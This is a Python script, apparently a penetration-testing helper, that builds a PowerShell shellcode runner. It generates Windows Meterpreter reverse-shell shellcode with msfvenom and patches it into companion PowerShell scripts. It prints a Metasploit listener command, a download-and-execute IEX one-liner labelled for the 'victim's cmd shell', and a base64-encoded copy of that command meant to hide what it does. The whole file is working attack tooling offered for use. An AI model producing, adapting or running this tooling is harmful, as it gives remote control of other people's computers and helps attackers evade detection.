#!/usr/bin/env python3
import subprocess
import base64
import re
import sys
import os
import ipaddress

def validate_ipv4(ip_str):
    """Validate that the input is a valid IPv4 address"""
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        return isinstance(ip_obj, ipaddress.IPv4Address)
    except ValueError:
        return False

def get_shellcode(lhost, lport, arch, payload_type):
    """Generate shellcode using msfvenom based on user inputs"""
    try:
        if arch == "x64":
            payload = f"windows/x64/meterpreter/reverse_{payload_type}"
        else:
            payload = f"windows/meterpreter/reverse_{payload_type}"
        
        print(f"[+] Generating {arch} {payload_type} payload...")
        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "EXITFUNC=thread",
            "-f", "powershell"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"[-] Error generating shellcode: {e.stderr}")
        return None
    except FileNotFoundError:
        print("[-] msfvenom not found. Please ensure it's installed and in your PATH.")
        return None

def parse_shellcode(msfvenom_output):
    """Extract the shellcode array from msfvenom output"""
    lines = msfvenom_output.split('\n')
    for line in lines:
        if line.strip().startswith('[Byte[]] $buf'):
            return line.strip()
    return None

def generate_encoded_command(lhost):
    """Generate the base64 encoded PowerShell command"""
    download_cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/runall.ps1')"
    encoded_cmd = base64.b64encode(download_cmd.encode('utf-16le')).decode('utf-8')
    return f"powershell -e {encoded_cmd}"

def update_runall_ps1(lhost):
    """Update the IP address in the first line of runall.ps1"""
    try:
        with open("runall.ps1", "r") as f:
            lines = f.readlines()
        
        if len(lines) < 1:
            print("[-] Error: runall.ps1 is empty")
            return False
        
        if lines[0].startswith("$ip = "):
            lines[0] = f"$ip = '{lhost}'\n"
        else:
            print("[-] Error: First line of runall.ps1 doesn't match expected pattern")
            return False
        
        with open("runall.ps1", "w") as f:
            f.writelines(lines)
        
        print("[+] Successfully updated runall.ps1 with new IP address")
        return True
    except Exception as e:
        print(f"[-] Error updating runall.ps1: {e}")
        return False

def update_shellcoderunner(shellcode):
    """Update line 44 of shellcoderunner.ps1 with the new shellcode"""
    try:
        with open("shellcoderunner.ps1", "r") as f:
            lines = f.readlines()
        
        if len(lines) < 44:
            print("[-] Error: shellcoderunner.ps1 has fewer than 44 lines")
            return False
        
        lines[43] = f"{shellcode}\n"
        
        with open("shellcoderunner.ps1", "w") as f:
            f.writelines(lines)
        
        print("[+] Successfully updated shellcoderunner.ps1 with new shellcode")
        return True
    except Exception as e:
        print(f"[-] Error updating shellcoderunner.ps1: {e}")
        return False

def main():
    print("\n=== PowerShell ShellCode Runner Generator ===")
    
    # Get and validate LHOST input (IPv4 only)
    while True:
        lhost = input("Enter LHOST IPv4 address: ").strip()
        if validate_ipv4(lhost):
            break
        print("[-] Invalid IPv4 address. Please enter a valid IPv4 address (e.g., 192.168.1.100)")
    
    # Get other inputs
    lport = input("Enter LPORT (e.g., 443): ").strip()
    
    arch = input("Enter architecture (x86/x64): ").strip().lower()
    if arch not in ["x86", "x64"]:
        print("Invalid architecture entered. Defaulting to 'x64'.")
        arch = "x64"
    
    payload_type = input("Enter payload type (https/tcp): ").strip().lower()
    if payload_type not in ["https", "tcp"]:
        print("Invalid payload type entered. Defaulting to 'tcp'.")
        payload_type = "tcp"
    
    # First update runall.ps1 with the IP address
    if not update_runall_ps1(lhost):
        sys.exit(1)
    
    # Generate shellcode
    print("\n[+] Generating shellcode with msfvenom...")
    msfvenom_output = get_shellcode(lhost, lport, arch, payload_type)
    if msfvenom_output is None:
        sys.exit(1)
    
    shellcode = parse_shellcode(msfvenom_output)
    if shellcode is None:
        print("[-] Failed to parse shellcode from msfvenom output")
        sys.exit(1)
    
    print("\n[+] Shellcode to be inserted:")
    print(shellcode)
    
    # Update the PowerShell script
    if not update_shellcoderunner(shellcode):
        sys.exit(1)

    # Print commands in the requested order with [+] prefixes
    print("\n[+] Start Msfconsole listener:")
    if arch == "x64":
        print(f"    msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_{payload_type}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"")
    else:
        print(f"    msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_{payload_type}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"")
    
    print("\n[+] In victim's cmd shell:")
    print(f"    powershell -c IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/runall.ps1')")
    
    # Generate and print encoded command
    encoded_cmd = generate_encoded_command(lhost)
    print("\n[+] Encoded PowerShell command:")
    print(encoded_cmd)

if __name__ == "__main__":
    main()
